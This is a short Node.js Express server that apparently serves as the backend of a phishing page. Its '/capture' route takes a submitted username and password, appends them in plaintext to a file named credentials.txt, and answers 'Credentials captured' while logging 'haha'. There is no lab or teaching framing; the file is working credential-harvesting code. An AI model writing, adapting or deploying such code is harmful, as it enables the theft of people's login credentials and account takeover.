const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

app.post('/capture', (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Failed to write to file', err);
            res.status(500).send('Server error');
        } else {
            res.send('Credentials captured');
            console.log("haha")
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});